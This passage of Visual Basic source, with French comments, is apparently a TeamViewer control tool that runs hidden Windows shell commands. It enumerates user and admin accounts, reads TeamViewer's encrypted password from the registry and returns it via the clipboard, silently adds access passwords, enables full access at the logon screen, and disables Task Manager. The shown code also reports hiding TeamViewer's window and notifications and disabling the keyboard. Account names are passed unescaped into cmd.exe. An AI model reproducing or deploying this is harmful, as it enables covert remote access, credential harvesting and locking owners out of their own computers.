    s1 = s1 & "Main TeamViewer Window is hidden" & vbCrLf
End If

If hidetvTrayNotification Then
    Released = False
    s1 = s1 & "TeamViewer notifications are hidden" & vbCrLf
End If

If WallPaperPermanent Then
    Released = False
    s1 = s1 & "WallPaper is permanently set" & vbCrLf
End If

If WelcomeScreenPermanent Then
    Released = False
    s1 = s1 & "Welcome Screen is permanently set" & vbCrLf
End If

s2 = vbCrLf & "Unrestricted items:" & vbCrLf & "-------------------" & vbCrLf

If Not nokey Then
    s2 = s2 & "Keyboard is not disabled" & vbCrLf
End If

If Not hidetv Then
    s2 = s2 & "TeamViewer Panel is not hidden" & vbCrLf
End If

If Not HideTVComp Then
    s2 = s2 & "Computers & Contacts is not hidden" & vbCrLf
End If

If Not Hide_MainTV Then
    s2 = s2 & "Main TeamViewer Window is not hidden" & vbCrLf
End If

If Not hidetvTrayNotification Then
    s2 = s2 & "TeamViewer notifications are not hidden" & vbCrLf
End If

If Not WallPaperPermanent Then
    s2 = s2 & "WallPaper can be changed" & vbCrLf
End If

If Not WelcomeScreenPermanent Then
    s2 = s2 & "Welcome Screen can be changed" & vbCrLf
End If

s = Prefix_answer & "GethtvpStatus" & vbCrLf
's = s & "htvp current status" & vbCrLf
's = s & "-------------------" & vbCrLf

If Released Then
    s = s & "Everything is released"
Else
    s = s & s1 & s2
End If

Set_Clipboard s

End Sub

Public Function GetAccountsList(Optional Send_answer As Boolean = True) As String

Dim s As String
Dim s_a As String
Dim s_r As String
Dim i As Integer
Dim c As String
Dim c1 As String
Dim s_admin As String
Dim s_users As String
Dim Saut As Boolean
Dim s_Computer As String
Dim S_user As String
Dim s_UserInfo As String

' Le nom de l'ordinateur
'-----------------------
ShellWait "cmd.exe /c ""echo %COMPUTERNAME% > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s_Computer
' Le nom de l'utilisateur courant
'--------------------------------
ShellWait "cmd.exe /c ""echo %USERNAME% > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, S_user

' Les administrateurs
'--------------------
' Le nom du groupe Admin
'-----------------------
s_a = Get_Group_Admin_Name(False)
If s_a <> "" Then
    ' La liste des admin...
    '----------------------
    ShellWait "cmd.exe /c ""net localgroup " & s_a & " > " & Fictmp & """", vbHide
    If Lecture_Intégrale_Fichier_Texte(Fictmp, s) Then
        ' On efface le fichier temporaire
        '--------------------------------
        Kill Fictmp
        ' On cherche la fin de la ligne de "-"
        '-------------------------------------
        i = InStr(1, s, "-------" & vbCr & vbLf)
        ' Si trouvée...
        '--------------
        If i > 0 Then
            ' On ne garde que la suite
            '-------------------------
            s = Right(s, Len(s) - i - 8)
            ' On recherche le point final
            '----------------------------
            i = InStr(1, s, "." & vbCr & vbLf)
            ' Si trouvé...
            '-------------
            If i > 0 Then
                ' On recherche le précédent saut de ligne
                '----------------------------------------
                Do
                    i = i - 1
                    If i < 1 Then Exit Do
                    c = Mid(s, i, 1)
                    If c = vbLf Then
                        ' On a trouvé : on élimine ce qui suit
                        '-------------------------------------
                        s = Left(s, i)
                        Exit Do
                    End If
                Loop
            End If
        End If
    End If
End If
' On les met en ligne, séparés par des ", "
'------------------------------------------
s_admin = ""
For i = 1 To Len(s)
    c = Mid(s, i, 1)
    If c = vbCr Then
        s_admin = s_admin + ", "
    ElseIf c <> vbLf Then
        s_admin = s_admin + c
    End If
Next i
s_admin = Left(s_admin, Len(s_admin) - 2) & vbCrLf

' Les utilisateurs
'-----------------
ShellWait "cmd.exe /c ""net Users > " & Fictmp & """", vbHide
If Lecture_Intégrale_Fichier_Texte(Fictmp, s) Then
    ' On efface le fichier temporaire
    '--------------------------------
    Kill Fictmp
    ' On cherche la fin de la ligne de "-"
    '-------------------------------------
    i = InStr(1, s, "-------" & vbCr & vbLf)
    ' Si trouvée...
    '--------------
    If i > 0 Then
        ' On ne garde que la suite
        '-------------------------
        s = Right(s, Len(s) - i - 8)
        ' On recherche le point final
        '----------------------------
        i = InStr(1, s, "." & vbCr & vbLf)
        ' Si trouvé...
        '-------------
        If i > 0 Then
            ' On recherche le précédent saut de ligne
            '----------------------------------------
            Do
                i = i - 1
                If i < 1 Then Exit Do
                c = Mid(s, i, 1)
                If c = vbLf Then
                    ' On a trouvé : on élimine ce qui suit
                    '-------------------------------------
                    s = Left(s, i)
                    Exit Do
                End If
            Loop
        End If
    End If
End If
' On les met en ligne, séparés par des ", "
'------------------------------------------
s_users = ""
Saut = False
For i = 1 To Len(s)
    ' Les espaces simples ne sont pas des séparateurs de noms, il en faut au moins deux de suite
    '-------------------------------------------------------------------------------------------
    c = Mid(s, i, 1)
    c1 = Mid(s, i, 2)
    If (c1 = "  ") Or ((c = " ") And Saut) Then
        If Not Saut Then
            Saut = True
            s_users = s_users + ", "
        End If
    ElseIf c = vbCr Then
        If Not Saut Then
            s_users = s_users + ", "
        End If
    Else
        Saut = False
        s_users = s_users + c
    End If
Next i
s_users = Left(s_users, Len(s_users) - 3)

'On prépare le résultat
'----------------------
s_r = "Computer name: " & s_Computer & vbCr _
    & "Current user name: " & S_user & vbCr _
    & "List of admin accounts: " & s_admin _
    & "List of users: " & s_users & vbCrLf
    
If Send_answer Then
    s_r = Prefix_answer & "GetAccountsList" & vbCrLf & s_r
    Set_Clipboard s_r
Else
    GetAccountsList = s_r
End If

End Function

Public Sub GetAccountDetails(Account_Name As String)

Dim s As String
Dim s_a As String
Dim s_r As String
Dim i As Integer
Dim c As String
Dim c1 As String
Dim s_admin As String
Dim s_users As String
Dim Saut As Boolean
Dim s_Computer As String
Dim S_user As String
Dim s_UserInfo As String
Dim Titre_Réponse As String

' Si l'utilisateur n'est pas spécifié, on prend l'utilisateur courant
'--------------------------------------------------------------------
If Trim(Account_Name) = "" Then
    ShellWait "cmd.exe /c ""echo %USERNAME% > " & Fictmp & """", vbHide
    Lecture_Intégrale_Fichier_Texte Fictmp, S_user
    S_user = Left(S_user, Len(S_user) - 3)
    Titre_Réponse = "Current user details" & vbCrLf & "--------------------"
Else
    S_user = Account_Name
    Titre_Réponse = "User details" & vbCrLf & "------------"
End If
' Les info sur l'utilisateur
'---------------------------
ShellWait "cmd.exe /c ""Net user """ & S_user & """ > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s_UserInfo
' On met le résultat dans le clipboard
'-------------------------------------
s_r = Prefix_answer & "GetAccountDetails" & vbCrLf _
    & Titre_Réponse & vbCrLf _
    & s_UserInfo
Set_Clipboard s_r

End Sub

Public Sub ProtectTool(Param As String)

Dim s_r As String

ToolPW = Param
EcrireIni "Protection", "ToolPW", ToolPW, Fic_ini
' On retourne un acquittement
'----------------------------
s_r = Prefix_answer & "ProtectTool" & vbCrLf
Set_Clipboard s_r

End Sub

Public Sub GetEncryptedTVOptionsPW()

Dim s As String
Dim i As Integer

' On lance la commande en récupérant le résultat
'-----------------------------------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v OptionsPasswordAES > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
' On met en forme le résultat et on le met dans le clipboard
'-----------------------------------------------------------
i = InStr(1, s, "OptionsPasswordAES")
If i > 0 Then s = Right(s, Len(s) - i + 1)
i = InStr(1, s, "REG_BINARY")
If i > 0 Then s = Left(s, Len("OptionsPasswordAES") + 1) & Right(s, Len(s) - i - Len("REG_BINARY") - 3)
s = "Return " & L_Prefix & " " & PC_Name & vbCrLf _
    & s
Set_Clipboard s

End Sub

Public Sub SetEncryptedTVOptionsPW(EncryptedOptionsPW As String)

' Si pas de paramètre on efface le mot de passe
'----------------------------------------------
If Trim(EncryptedOptionsPW) = "" Then
    ShellWait "cmd.exe /c ""reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v OptionsPasswordAES /f""", vbHide
' Sinon on y met la valeur
'-------------------------
Else
    ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v OptionsPasswordAES /t REG_BINARY /d " & EncryptedOptionsPW & " /f""", vbHide
End If

End Sub

Public Sub TVSetWindowsLogonForAllUsers()

ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Security_WinLogin /t REG_DWORD /d 0x2 /f""", vbHide

End Sub

Public Sub AddEncryptedTVAccessPW(ID As String, EncryptedPW As String)

Dim s_IDs As String
Dim s_PWs As String
Dim i As Integer
Dim j As Integer

' Si pas de paramètres on sort
'-----------------------------
If (Trim(ID) = "") Or (Trim(EncryptedPW) = "") Then
    Exit Sub
Else
    ' On lit les IDs existants
    '-------------------------
    ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v MultiPwdMgmtIDs > " & Fictmp & """", vbHide
    Lecture_Intégrale_Fichier_Texte Fictmp, s_IDs
    i = InStr(1, s_IDs, "MultiPwdMgmtIDs    REG_MULTI_SZ    ")
    If i > 0 Then s_IDs = Right(s_IDs, Len(s_IDs) - i + 1 - Len("MultiPwdMgmtIDs    REG_MULTI_SZ    "))
    i = InStr(1, s_IDs, vbCrLf)
    If i > 0 Then s_IDs = Left(s_IDs, i - 1)
    ' On lit les PWs existants
    '-------------------------
    ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v MultiPwdMgmtPwdData > " & Fictmp & """", vbHide
    Lecture_Intégrale_Fichier_Texte Fictmp, s_PWs
    i = InStr(1, s_PWs, "MultiPwdMgmtPwdData    REG_MULTI_SZ    ")
    If i > 0 Then s_PWs = Right(s_PWs, Len(s_PWs) - i + 1 - Len("MultiPwdMgmtPwdData    REG_MULTI_SZ    "))
    i = InStr(1, s_PWs, vbCrLf)
    If i > 0 Then s_PWs = Left(s_PWs, i - 1)
    ' On ajoute les valeurs à ajouter
    '--------------------------------
    s_IDs = s_IDs & "\0" & ID
    s_PWs = s_PWs & "\0" & EncryptedPW
    ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v MultiPwdMgmtIDs /t REG_MULTI_SZ /d " & s_IDs & " /f""", vbHide
    ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v MultiPwdMgmtPwdData /t REG_MULTI_SZ /d " & s_PWs & " /f""", vbHide
End If

End Sub

Public Function GetTVParameters(Optional Send_answer As Boolean = True) As String

Dim s As String
Dim s_out As String
Dim i As Integer

s_out = ""
' Starts with Windows
'--------------------
s_out = GetTVParam_Start_With_Windows(s_out)
' Personal access password
'-------------------------
s_out = GetTVParam_Permanent_Access_PW(s_out)
' List of permanent password names
'---------------------------------
s_out = GetTVParam_Perm_Acc_PW_Names(s_out)
' Windows login
'--------------
s_out = GetTVParam_Windows_Login(s_out)
' Black list
'-----------
s_out = GetTVParam_Black_List(s_out)
' Buddy Black list
'-----------------
s_out = GetTVParam_Black_List_Buddy(s_out)
' White list
'-----------
s_out = GetTVParam_White_List(s_out)
' Buddy White list
'-----------------
s_out = GetTVParam_White_List_Buddy(s_out)
' AccessControl
'--------------
s_out = GetTVParam_Access_Control(s_out)
' Full Access Control on Logon screen
'------------------------------------
s_out = GetTVParam_Full_Access_Control_on_Logon_Screen(s_out)
' TV Logs
'--------
s_out = GetTVParam_Loging(s_out)
' Disable remote drag & drop integration
'---------------------------------------
's_out = GetTVParam_Disable_remote_drag_drop(s_out)
' Disable TV Shutdown
'--------------------
s_out = GetTVParam_Disable_TV_Shutdown(s_out)
' Changes require Admin rights
'-----------------------------
s_out = GetTVParam_Changes_require_admin_rights(s_out)
' Options password
'-----------------
s_out = GetTVParam_Options_PW(s_out)

If Send_answer Then
    s_out = Prefix_answer & "GetTVParameters" & vbCrLf & s_out
    Set_Clipboard s_out
Else
    GetTVParameters = s_out
End If

End Function

Public Function GetTVOptionParameters(Optional Send_answer As Boolean = True) As String

Dim s As String
Dim s_out As String
Dim i As Integer

s_out = ""
' Starts with Windows
'--------------------
s_out = GetTVParam_Start_With_Windows(s_out)
' Changes require Admin rights
'-----------------------------
s_out = GetTVParam_Changes_require_admin_rights(s_out)
' Options password
'-----------------
s_out = GetTVParam_Options_PW(s_out)

If Send_answer Then
    s_out = Prefix_answer & "GetTVOptionParameters" & vbCrLf & s_out
    Set_Clipboard s_out
Else
    GetTVOptionParameters = s_out
End If

End Function

Public Function GetTVParam_Access_Control(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' AccessControl
'--------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\AccessControl /v AC_Server_AccessControlType > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "AC_Server_AccessControlType")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0x")
        If i > 0 Then
            s = Mid(s, i + 2, 1)
            Select Case s
                Case 1:
                    s1 = s1 & "Access control for connections to this computer: Confirm all" & vbCrLf
                Case 2:
                    s1 = s1 & "Access control for connections to this computer: View ans show" & vbCrLf
                Case "a":
                    s1 = s1 & "Access control for connections to this computer: Deny incoming remote control sessions" & vbCrLf
            End Select
        End If
    End If
Else
    s1 = s1 & "Access control for connections to this computer: Full Access" & vbCrLf
End If
GetTVParam_Access_Control = s1

End Function

Public Function GetTVParam_Full_Access_Control_on_Logon_Screen(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' AccessControl
'--------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v ACFullAccessOnLoginScreen > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "ACFullAccessOnLoginScreen")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0x")
        If i > 0 Then
            s = Mid(s, i + 2, 1)
            Select Case s
                Case 1:
                    s1 = s1 & "Full access control when connected to logon screen: Yes" & vbCrLf
                Case Else:
                    s1 = s1 & "Full access control when connected to logon screen: No" & vbCrLf
            End Select
        End If
    End If
Else
    s1 = s1 & "Full access control when connected to logon screen: No" & vbCrLf
End If
GetTVParam_Full_Access_Control_on_Logon_Screen = s1

End Function

Public Function GetTVParam_Start_With_Windows(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Starts with Windows
'--------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Always_Online > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Always_Online")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0x")
        If i > 0 Then
            s = Mid(s, i + 2, 1)
            Select Case s
                Case 1:
                    s1 = s1 & "Starts with Windows: Yes" & vbCrLf
                Case Else:
                    s1 = s1 & "Starts with Windows: No" & vbCrLf
            End Select
        End If
    End If
Else
    s1 = s1 & "Starts with Windows: No" & vbCrLf
End If
GetTVParam_Start_With_Windows = s1

End Function

Public Function GetTVParam_Disable_TV_Shutdown(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Starts with Windows
'--------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Security_Disableshutdown > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Security_Disableshutdown")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0x")
        If i > 0 Then
            s = Mid(s, i + 2, 1)
            Select Case s
                Case 1:
                    s1 = s1 & "Disable TeamViewer shutdown: Yes" & vbCrLf
                Case Else:
                    s1 = s1 & "Disable TeamViewer shutdown: No" & vbCrLf
            End Select
        End If
    End If
Else
    s1 = s1 & "Disable TeamViewer shutdown: No" & vbCrLf
End If
GetTVParam_Disable_TV_Shutdown = s1

End Function

Public Function GetTVParam_Changes_require_admin_rights(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Starts with Windows
'--------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Security_Adminrights > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Security_Adminrights")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0x")
        If i > 0 Then
            s = Mid(s, i + 2, 1)
            Select Case s
                Case 1:
                    s1 = s1 & "Changes require admin rights: Yes" & vbCrLf
                Case Else:
                    s1 = s1 & "Changes require admin rights: No" & vbCrLf
            End Select
        End If
    End If
Else
    s1 = s1 & "Changes require admin rights: No" & vbCrLf
End If
GetTVParam_Changes_require_admin_rights = s1

End Function

Public Function GetTVParam_Full_Access_On_Login_Screen(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Starts with Windows
'--------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v ACFullAccessOnLoginScreen > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "ACFullAccessOnLoginScreen")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0x")
        If i > 0 Then
            s = Mid(s, i + 2, 1)
            Select Case s
                Case 1:
                    s1 = s1 & "Full access on login screen: Yes" & vbCrLf
                Case Else:
                    s1 = s1 & "Full access on login screen: No" & vbCrLf
            End Select
        End If
    End If
Else
    s1 = s1 & "Full access on login screen: No" & vbCrLf
End If
GetTVParam_Full_Access_On_Login_Screen = s1

End Function

Public Function GetTVParam_Black_List(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Black list
'-----------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Blacklist > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Blacklist")
If i > 0 Then
    i = InStr(1, s, "REG_MULTI_SZ")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_MULTI_SZ") - 3)
        Do
            i = InStr(1, s, "\0")
            If i > 0 Then
                s = Left(s, i - 1) & ", " & Right(s, Len(s) - i - 1)
            Else
                Exit Do
            End If
        Loop
        i = InStr(1, s, vbLf)
        If i > 0 Then s = Left(s, i - 1)
        s1 = s1 & "Blacklist: " & s & vbLf
    End If
Else
    s1 = s1 & "Blacklist: Empty" & vbCrLf
End If
GetTVParam_Black_List = s1

End Function

Public Function GetTVParam_Black_List_Buddy(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Buddy Black list
'-----------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v BlacklistBuddy > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "BlacklistBuddy")
If i > 0 Then
    i = InStr(1, s, "REG_MULTI_SZ")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_MULTI_SZ") - 3)
        Do
            i = InStr(1, s, "\0")
            If i > 0 Then
                s = Left(s, i - 1) & ", " & Right(s, Len(s) - i - 1)
            Else
                Exit Do
            End If
        Loop
        i = InStr(1, s, vbLf)
        If i > 0 Then s = Left(s, i - 1)
        s1 = s1 & "Buddy Blacklist: " & s & vbLf
    End If
Else
    s1 = s1 & "Buddy Blacklist: Empty" & vbCrLf
End If
GetTVParam_Black_List_Buddy = s1

End Function

Public Function GetTVParam_White_List(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' White list
'-----------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Whitelist > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Whitelist")
If i > 0 Then
    i = InStr(1, s, "REG_MULTI_SZ")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_MULTI_SZ") - 3)
        Do
            i = InStr(1, s, "\0")
            If i > 0 Then
                s = Left(s, i - 1) & ", " & Right(s, Len(s) - i - 1)
            Else
                Exit Do
            End If
        Loop
        i = InStr(1, s, vbLf)
        If i > 0 Then s = Left(s, i - 1)
        s1 = s1 & "Whitelist: " & s & vbLf
    End If
Else
    s1 = s1 & "Whitelist: Empty" & vbCrLf
End If
GetTVParam_White_List = s1

End Function

Public Function GetTVParam_White_List_Buddy(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Buddy White list
'-----------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v WhitelistBuddy > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "WhitelistBuddy")
If i > 0 Then
    i = InStr(1, s, "REG_MULTI_SZ")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_MULTI_SZ") - 3)
        Do
            i = InStr(1, s, "\0")
            If i > 0 Then
                s = Left(s, i - 1) & ", " & Right(s, Len(s) - i - 1)
            Else
                Exit Do
            End If
        Loop
        i = InStr(1, s, vbLf)
        If i > 0 Then s = Left(s, i - 1)
        s1 = s1 & "Buddy Whitelist: " & s & vbLf
    End If
Else
    s1 = s1 & "Buddy Whitelist: Empty" & vbCrLf
End If
GetTVParam_White_List_Buddy = s1

End Function

Public Function GetTVParam_Options_PW(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Options password
'-----------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v OptionsPasswordAES > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "OptionsPasswordAES")
If i > 0 Then
    s1 = s1 & "TV Options password: Yes" & vbCrLf
Else
    s1 = s1 & "TV Options password: No" & vbCrLf
End If
GetTVParam_Options_PW = s1

End Function

Public Function GetTVParam_Perm_Acc_PW_Names(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' List of permanent password names
'---------------------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v MultiPwdMgmtIDs > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "MultiPwdMgmtIDs")
If i > 0 Then
    i = InStr(1, s, "REG_MULTI_SZ")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_MULTI_SZ") - 3)
        Do
            i = InStr(1, s, "\0")
            If i > 0 Then
                s = Left(s, i - 1) & ", " & Right(s, Len(s) - i - 1)
            Else
                Exit Do
            End If
        Loop
        i = InStr(1, s, vbLf)
        If i > 0 Then s = Left(s, i - 1)
        s1 = s1 & "Additional permanent password's names: " & s & vbLf
    End If
Else
    s1 = s1 & "Additional permanent password's names: Empty" & vbCrLf
End If
GetTVParam_Perm_Acc_PW_Names = s1

End Function

Public Function GetTVParam_Permanent_Access_PW(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Permanent access password
'--------------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v PermanentPassword > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "PermanentPassword")
If i > 0 Then
    s1 = s1 & "Personal password for unattended access: Yes" & vbCrLf
Else
    s1 = s1 & "Personal password for unattended access: No" & vbCrLf
End If
GetTVParam_Permanent_Access_PW = s1

End Function

Public Sub TVRemovePersonalPWForUnattendedAccess()

' Remove the personal access password
'------------------------------------
ShellWait "cmd.exe /c ""reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v PermanentPassword /f""", vbHide

End Sub

Public Function GetTVParam_Windows_Login(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out
' Windows login
'--------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Security_WinLogin > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Security_WinLogin")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "1")
        If i > 0 Then
            s1 = s1 & "Windows logon: Allowed for administrators only" & vbCrLf
        Else
            s1 = s1 & "Windows logon: Allowed for all users" & vbCrLf
        End If
    End If
Else
    s1 = s1 & "Windows logon: Not allowed" & vbCrLf
End If
GetTVParam_Windows_Login = s1

End Function

Public Function GetTVParam_Loging(s_out As String) As String

Dim s As String
Dim s1 As String
Dim i As Integer

s1 = s_out & "Log files (Enable loging/Log outgoing connections/Log incoming connections): "
' TV Logs
'--------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Logging > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "Logging")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0")
        If i > 0 Then
            s1 = s1 & "Off"
        Else
            s1 = s1 & "On"
        End If
    End If
Else
    s1 = s1 & "On"
End If
' TV Logs Incoming Connexions
'----------------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v LogOutgoingConnections > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "LogOutgoingConnections")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0")
        If i > 0 Then
            s1 = s1 & "/Off"
        Else
            s1 = s1 & "/On"
        End If
    End If
Else
    s1 = s1 & "/On"
End If
' TV Logs Incoming Connexions
'----------------------------
ShellWait "cmd.exe /c ""reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v LogIncomingConnections > " & Fictmp & """", vbHide
Lecture_Intégrale_Fichier_Texte Fictmp, s
i = InStr(1, s, "LogIncomingConnections")
If i > 0 Then
    i = InStr(1, s, "REG_DWORD")
    If i > 0 Then
        s = Right(s, Len(s) - i - Len("REG_DWORD") - 3)
        i = InStr(1, s, "0")
        If i > 0 Then
            s1 = s1 & "/Off" & vbCrLf
        Else
            s1 = s1 & "/On" & vbCrLf
        End If
    End If
Else
    s1 = s1 & "/On" & vbCrLf
End If
GetTVParam_Loging = s1

End Function

Public Sub TVStartsWithWindows()

ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Always_Online /t REG_DWORD /d 1 /f""", vbHide

End Sub

Public Sub TVDoesNotStartWithWindows()

ShellWait "cmd.exe /c ""reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Always_Online /f""", vbHide

End Sub

Public Sub TVChangesRequireAdminRights()

ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Security_Adminrights /t REG_DWORD /d 1 /f""", vbHide

End Sub

Public Sub TVChangesDoNotRequireAdminRights()

ShellWait "cmd.exe /c ""reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Security_Adminrights /f""", vbHide

End Sub

Public Sub DisableTaskManager()

ShellWait "cmd.exe /c ""reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f""", vbHide

End Sub

Public Sub EnableTaskManager()

ShellWait "cmd.exe /c ""reg DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f""", vbHide

End Sub

Public Sub TVFullAccessOnLogonScreen()

ShellWait "cmd.exe /c ""reg add HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v ACFullAccessOnLoginScreen /t REG_DWORD /d 1 /f""", vbHide

End Sub

Public Sub TVEnableLogings()

ShellWait "cmd.exe /c ""reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Logging /f""", vbHide
